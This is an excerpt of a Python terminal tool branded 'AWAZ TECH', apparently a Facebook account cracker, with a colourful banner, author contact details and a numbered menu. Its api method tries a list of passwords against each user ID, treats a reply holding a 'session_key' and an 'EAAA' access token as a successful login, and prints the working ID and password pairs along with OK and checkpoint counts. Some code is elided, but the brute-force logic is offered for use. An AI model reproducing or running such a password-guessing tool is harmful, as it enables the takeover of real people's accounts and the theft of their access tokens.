#THE TOOL CREATED BY AWAZ TECH
#BD Cyber Zone-BCZ
#FB : https://www.facebook.com/AwazTech077/
#PAGE : AWAZ TECH
#Programer AWAZ TECH
#𝐖𝐇𝐀𝐓'𝐒 𝐀𝐏𝐏 : +93775249673
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
\33[1;32m𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 AWAZ Tech 𝐓𝐨𝐨𝐥𝐬

\33[1;34m✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨


╔════════════════════════════════════════╗
║\33[1;32m[↦] 𝙰𝚄𝚃𝙷𝙾𝚁     : 𝑆𝐻𝐴𝐻𝑍𝐴𝐷 𝑅𝐴𝐻𝐼𝑀𝑌
║\33[1;32m[↦] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺   : MOHAMMAD TANHA
║\33[1;32m[↦] 𝙶𝙸𝚃𝙷𝚄𝙱     : Mohammad Tanha 
║\33[1;32m[↦] 𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙   : +93775249673
║\33[1;32m[↦] 𝚂𝚝𝚊𝚝𝚞𝚜     : 𝙵𝚛𝚎𝚎
║\33[1;32m[↦] 𝚃𝙴𝙰𝙼       : AWAZ TECH
...
class Main:
	def __init__(self):
		...
		if DEVIL in ["1", "01"]:
			self.fbtua()
		if DEVIL in ["2", "02"]:
			os.system('xdg-open https://github.com/mohammadtanha')
		if DEVIL in ["3", "03"]:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[AWAZ] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [AWAZ] %s | %s\033[1;32m         "%(uid, pw))
